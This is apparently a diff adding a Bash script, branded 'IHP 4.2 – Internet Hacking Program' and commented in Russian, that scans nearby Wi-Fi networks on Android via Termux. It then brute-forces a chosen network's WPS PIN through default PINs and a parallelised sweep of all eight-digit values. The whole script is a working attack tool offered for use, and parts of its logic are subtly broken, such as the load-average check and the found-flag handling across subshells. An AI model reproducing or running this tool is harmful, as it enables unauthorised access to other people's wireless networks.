@@ -1,0 +1,160 @@
+#!/bin/bash
+# IHP 4.2 – адаптивная версия, которая не падает от SIGKILL
+clear
+
+scan_networks() {
+    echo "=== Network Info Scan ==="
+    echo ""
+    printf "%-3s %-22s %-20s %-6s %-4s\n" "No." "SSID" "BSSID" "RSSI" "WPS"
+    echo "----------------------------------------------------------------"
+    termux-wifi-scaninfo | jq -r '.[] | [.ssid, .bssid, .rssi, (if .capabilities | contains("WPS") then "YES" else "NO" end)] | @tsv' | \
+    nl -w3 -s' ' | while read num ssid bssid rssi wps; do
+        ssid_clean="${ssid:0:22}"
+        printf "%-3s %-22s %-20s %-6s %-4s\n" "$num" "$ssid_clean" "$bssid" "$rssi" "$wps"
+    done
+    echo ""
+}
+
+brute_network() {
+    local target_ssid="$1"
+    local start_pin="$2"
+    local max_channels="$3"
+    echo "[*] Searching for network '$target_ssid'..."
+
+    local best_entry
+    best_entry=$(termux-wifi-scaninfo | jq -r --arg ssid "$target_ssid" '.[] | select(.ssid == $ssid and (.capabilities | contains("WPS"))) | [.bssid, .rssi, .frequency_mhz] | @tsv' | sort -t$'\t' -k2 -rn | head -1)
+
+    if [ -z "$best_entry" ]; then
+        echo "[!] Network '$target_ssid' not found or WPS is disabled."
+        return 1
+    fi
+
+    local bssid rssi freq
+    IFS=$'\t' read -r bssid rssi freq <<< "$best_entry"
+    echo "[+] Found: $target_ssid  BSSID: $bssid  RSSI: $rssi  WPS: YES"
+    echo "[*] Adaptive brute force (max $max_channels channels)..."
+
+    export target_ssid bssid
+    FOUND=0
+    ACTIVE_CHANNELS=0
+    MAX_ACTIVE=$((max_channels * 2))  # не более 2 процессов на канал
+
+    try_pin() {
+        local pin=$1
+        local cid=$2
+        printf "[Ch %-2d] Trying PIN: %s\n" "$cid" "$pin"
+        cmd wifi connect-network "$target_ssid" wps pin "$pin" 2>/dev/null
+        if termux-wifi-connectioninfo 2>/dev/null | grep -q "$target_ssid"; then
+            echo -e "\n\n[+] PIN FOUND: $pin"
+            echo "[+] Connected to $target_ssid"
+            FOUND=1
+            kill -TERM -$$  # завершить все дочерние процессы
+        fi
+    }
+
+    # Фазы 1 и 2 только если start_pin не задан
+    if [ -z "$start_pin" ]; then
+        echo "[*] Phase 1: Standard PINs..."
+        standard_pins=(12345678 00000000 11111111 22222222 33333333 44444444 55555555 66666666 77777777 88888888 99999999)
+        for pin in "${standard_pins[@]}"; do
+            try_pin "$pin" 0
+        done
+
+        echo "[*] Phase 2: Quick range 0-9999..."
+        for ((i=0; i<=9999; i++)); do
+            pin=$(printf "%08d" $i)
+            try_pin "$pin" 0
+        done
+    else
+        start_pin_num=$((10#$start_pin))
+    fi
+
+    # Фаза 3: адаптивный многоканальный перебор
+    echo "[*] Phase 3: Adaptive multi-channel from ${start_pin:-00000000} to 99999999..."
+    if [ -z "$start_pin_num" ]; then start_pin_num=0; fi
+    total=100000000
+    range=$(( (total - start_pin_num) / max_channels ))
+
+    channel_pool=()
+    for ((ch=1; ch<=max_channels; ch++)); do
+        from=$(( start_pin_num + (ch-1)*range ))
+        to=$(( start_pin_num + ch*range - 1 ))
+        [ $ch -eq $max_channels ] && to=99999999
+        channel_pool+=("$from:$to")
+    done
+
+    # Запускаем каналы постепенно, не превышая лимит процессов
+    active_pids=()
+    next_ch=0
+    while [ $next_ch -lt ${#channel_pool[@]} ] || [ ${#active_pids[@]} -gt 0 ]; do
+        # Запускаем новые каналы, если есть свободное место
+        while [ ${#active_pids[@]} -lt $MAX_ACTIVE ] && [ $next_ch -lt ${#channel_pool[@]} ]; do
+            IFS=':' read -r from to <<< "${channel_pool[$next_ch]}"
+            (
+                for ((pin=from; pin<=to; pin++)); do
+                    [ $FOUND -eq 1 ] && exit 0
+                    try_pin "$(printf "%08d" $pin)" "$((next_ch+1))"
+                    sleep 0.05
+                done
+            ) &
+            active_pids+=($!)
+            ((next_ch++))
+        done
+
+        # Ждём завершения любого процесса, затем продолжаем
+        if [ ${#active_pids[@]} -gt 0 ]; then
+            wait -n ${active_pids[@]} 2>/dev/null
+            # Убираем завершившиеся PID из списка
+            new_active=()
+            for pid in "${active_pids[@]}"; do
+                if kill -0 "$pid" 2>/dev/null; then
+                    new_active+=("$pid")
+                fi
+            done
+            active_pids=("${new_active[@]}")
+        fi
+
+        # Адаптивная пауза при высокой нагрузке
+        if [ $(wc -l < /proc/loadavg | awk '{print $1}') > 3.0 ]; then
+            sleep 0.5
+        fi
+    done
+
+    echo -e "\n[*] Done."
+}
+
+while true; do
+    echo "╔══════════════════════════════════════╗"
+    echo "║  IHP 4.2 - Internet Hacking Program  ║"
+    echo "║  Developer: aKernel Software          ║"
+    echo "╚══════════════════════════════════════╝"
+    echo ""
+    echo "  [1] Network Scan"
+    echo "  [2] WPS Brute (by network name)"
+    echo "  [3] Exit"
+    echo ""
+    read -p "Select option: " option
+
+    case $option in
+        1)
+            scan_networks
+            read -p "Press Enter to continue..."
+            ;;
+        2)
+            echo ""
+            read -p "Network name: " SSID
+            read -p "Channels (1-20, default 5): " CHANNELS
+            CHANNELS=${CHANNELS:-5}
+            read -p "Start PIN (leave empty for default 00000000): " START_PIN
+            brute_network "$SSID" "$START_PIN" "$CHANNELS"
+            read -p "Press Enter to continue..."
+            ;;
+        3)
+            echo "Exiting..."
+            exit 0
+            ;;
+        *)
+            echo "Invalid option"
+            ;;
+    esac
+done
